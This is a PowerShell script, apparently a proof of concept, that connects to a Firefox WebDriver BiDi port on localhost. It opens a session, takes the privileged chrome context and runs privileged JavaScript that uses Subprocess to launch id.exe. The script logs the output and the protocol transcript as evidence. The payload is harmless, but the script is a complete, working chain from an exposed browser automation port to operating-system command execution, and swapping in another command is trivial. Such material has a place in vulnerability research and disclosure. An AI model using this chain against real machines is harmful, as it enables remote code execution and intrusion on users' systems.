[CmdletBinding()]
param(
    [Parameter(Mandatory)][ValidateRange(1, 65535)][int]$Port,
    [Parameter(Mandatory)][ValidatePattern("^[0-9a-fA-F]{32}$")][string]$Nonce,
    [Parameter(Mandatory)][string]$EvidencePath,
    [int]$ConnectTimeoutSeconds = 45
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

$EvidencePath = [IO.Path]::GetFullPath($EvidencePath)
$EvidenceDirectory = [IO.Path]::GetDirectoryName($EvidencePath)
New-Item -ItemType Directory -Path $EvidenceDirectory -Force | Out-Null

$Transcript = [Collections.Generic.List[object]]::new()
$Socket = $null
$SessionCreated = $false

function Send-BiDiCommand {
    param(
        [Parameter(Mandatory)][Net.WebSockets.ClientWebSocket]$Connection,
        [Parameter(Mandatory)][int]$Id,
        [Parameter(Mandatory)][string]$Method,
        [Parameter(Mandatory)][hashtable]$Params
    )

    $Packet = [ordered]@{
        id = $Id
        method = $Method
        params = $Params
    }
    $Transcript.Add([ordered]@{ direction = "send"; packet = $Packet })
    $Json = $Packet | ConvertTo-Json -Compress -Depth 20
    $Bytes = [Text.Encoding]::UTF8.GetBytes($Json)
    $Segment = [ArraySegment[byte]]::new($Bytes)
    $Timeout = [Threading.CancellationTokenSource]::new()
    try {
        $Timeout.CancelAfter(30000)
        $Connection.SendAsync(
            $Segment,
            [Net.WebSockets.WebSocketMessageType]::Text,
            $true,
            $Timeout.Token
        ).GetAwaiter().GetResult()
    } finally {
        $Timeout.Dispose()
    }
}

function Receive-BiDiResponse {
    param(
        [Parameter(Mandatory)][Net.WebSockets.ClientWebSocket]$Connection,
        [Parameter(Mandatory)][int]$ExpectedId
    )

    while ($true) {
        $Stream = [IO.MemoryStream]::new()
        try {
            do {
                $Buffer = [byte[]]::new(65536)
                $Segment = [ArraySegment[byte]]::new($Buffer)
                $Timeout = [Threading.CancellationTokenSource]::new()
                try {
                    $Timeout.CancelAfter(30000)
                    $ReceiveResult = $Connection.ReceiveAsync(
                        $Segment,
                        $Timeout.Token
                    ).GetAwaiter().GetResult()
                } finally {
                    $Timeout.Dispose()
                }
                if ($ReceiveResult.MessageType -eq [Net.WebSockets.WebSocketMessageType]::Close) {
                    throw "The Firefox WebDriver BiDi connection closed before response $ExpectedId."
                }
                $Stream.Write($Buffer, 0, $ReceiveResult.Count)
            } while (-not $ReceiveResult.EndOfMessage)

            $Text = [Text.Encoding]::UTF8.GetString($Stream.ToArray())
            $Packet = $Text | ConvertFrom-Json -Depth 100
            $Transcript.Add([ordered]@{ direction = "receive"; packet = $Packet })
            if ($Packet.PSObject.Properties.Name -contains "id" -and
                [int]$Packet.id -eq $ExpectedId) {
                if ($Packet.type -eq "error") {
                    throw "WebDriver BiDi command $ExpectedId failed: $($Packet.error): $($Packet.message)"
                }
                return $Packet
            }
        } finally {
            $Stream.Dispose()
        }
    }
}

function Invoke-BiDiCommand {
    param(
        [Parameter(Mandatory)][Net.WebSockets.ClientWebSocket]$Connection,
        [Parameter(Mandatory)][int]$Id,
        [Parameter(Mandatory)][string]$Method,
        [Parameter(Mandatory)][hashtable]$Params
    )
    Send-BiDiCommand -Connection $Connection -Id $Id -Method $Method -Params $Params
    return Receive-BiDiResponse -Connection $Connection -ExpectedId $Id
}

try {
    $RemoteUri = [Uri]"ws://127.0.0.1:$Port/session"
    $Deadline = (Get-Date).AddSeconds($ConnectTimeoutSeconds)
    $LastConnectionError = $null
    do {
        $CandidateSocket = [Net.WebSockets.ClientWebSocket]::new()
        $AttemptTimeout = [Threading.CancellationTokenSource]::new()
        try {
            $AttemptTimeout.CancelAfter(3000)
            $CandidateSocket.ConnectAsync(
                $RemoteUri,
                $AttemptTimeout.Token
            ).GetAwaiter().GetResult()
            $Socket = $CandidateSocket
            $CandidateSocket = $null
        } catch {
            $LastConnectionError = $_.Exception.Message
        } finally {
            $AttemptTimeout.Dispose()
            if ($null -ne $CandidateSocket) {
                $CandidateSocket.Dispose()
            }
        }
        if ($null -eq $Socket) {
            Start-Sleep -Milliseconds 250
        }
    } while ($null -eq $Socket -and (Get-Date) -lt $Deadline)

    if ($null -eq $Socket) {
        throw "Timed out connecting to $RemoteUri. Last error: $LastConnectionError"
    }

    $NewSession = Invoke-BiDiCommand -Connection $Socket -Id 1 -Method "session.new" -Params @{
        capabilities = @{
            alwaysMatch = @{
                webSocketUrl = $true
            }
        }
    }
    $SessionCreated = $true

    $Tree = Invoke-BiDiCommand -Connection $Socket -Id 2 -Method "browsingContext.getTree" -Params @{
        "moz:scope" = "chrome"
    }
    $ChromeContexts = @($Tree.result.contexts)
    if ($ChromeContexts.Count -eq 0) {
        throw "Firefox returned no privileged chrome browsing context."
    }
    $ChromeContext = $ChromeContexts[0]

    $FunctionDeclaration = @'
async () => {
  const nonce = "__WINFIRE_NONCE__";
  const { Subprocess } = ChromeUtils.importESModule(
    "resource://gre/modules/Subprocess.sys.mjs"
  );
  let command;
  try {
    command = await Subprocess.pathSearch("id.exe");
  } catch (error) {
    command = `${Services.env.get("ProgramFiles")}\\Git\\usr\\bin\\id.exe`;
  }
  const process = await Subprocess.call({
    command,
    arguments: [],
    stderr: "stdout",
  });
  if (process.stdin) {
    await process.stdin.close();
  }
  let output = "";
  while (true) {
    const chunk = await process.stdout.readString();
    if (!chunk) {
      break;
    }
    output += chunk;
  }
  const { exitCode } = await process.wait();
  return JSON.stringify({
    nonce,
    firefoxPid: Services.appinfo.processID,
    command,
    childPid: process.pid,
    exitCode,
    output,
  });
}
'@.Replace("__WINFIRE_NONCE__", $Nonce)

    $Call = Invoke-BiDiCommand -Connection $Socket -Id 3 -Method "script.callFunction" -Params @{
        functionDeclaration = $FunctionDeclaration
        awaitPromise = $true
        arguments = @()
        target = @{
            context = [string]$ChromeContext.context
        }
    }
    if ($Call.result.type -ne "success") {
        throw "The privileged script did not return a success result."
    }
    if ($Call.result.result.type -ne "string") {
        throw "The privileged script returned an unexpected remote value type."
    }
    $Execution = $Call.result.result.value | ConvertFrom-Json -Depth 20

    $Evidence = [ordered]@{
        captured_at_utc = (Get-Date).ToUniversalTime().ToString("o")
        endpoint = $RemoteUri.AbsoluteUri
        nonce = $Nonce
        session_id = $NewSession.result.sessionId
        chrome_context = [ordered]@{
            context = $ChromeContext.context
            url = $ChromeContext.url
        }
        execution = $Execution
        transcript = $Transcript
    }
    $Evidence | ConvertTo-Json -Depth 100 | Set-Content -LiteralPath $EvidencePath -Encoding utf8NoBOM
    $Execution | ConvertTo-Json -Compress -Depth 20 | Write-Output
} catch {
    $FailureEvidence = [ordered]@{
        captured_at_utc = (Get-Date).ToUniversalTime().ToString("o")
        endpoint = "ws://127.0.0.1:$Port/session"
        nonce = $Nonce
        error = $_.Exception.Message
        transcript = $Transcript
    }
    $FailureEvidence | ConvertTo-Json -Depth 100 | Set-Content -LiteralPath $EvidencePath -Encoding utf8NoBOM
    throw
} finally {
    if ($null -ne $Socket) {
        if ($SessionCreated -and $Socket.State -eq [Net.WebSockets.WebSocketState]::Open) {
            try {
                Send-BiDiCommand -Connection $Socket -Id 4 -Method "session.end" -Params @{}
                $null = Receive-BiDiResponse -Connection $Socket -ExpectedId 4
            } catch {
                # Evidence has already been collected; shutdown is best-effort.
            }
        }
        $Socket.Dispose()
    }
}
